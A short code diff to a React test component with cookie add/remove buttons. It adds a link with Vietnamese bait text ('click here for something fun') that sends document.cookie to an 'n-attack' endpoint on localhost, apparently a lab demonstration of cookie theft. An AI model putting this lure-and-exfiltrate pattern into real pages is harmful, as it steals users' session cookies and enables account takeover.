@@ -23,6 +23,7 @@ export default function TestS() {
             </p>
             <button onClick={add}>Add cookie</button>
             <button onClick={remove}>Remove cookie</button>
+            <a target='_blank' href={`http://localhost:8089/n-attack/?xxx=${document.cookie}`}>Nhấn vào đây có điều thú vị nha</a>
         </>
     )
 }
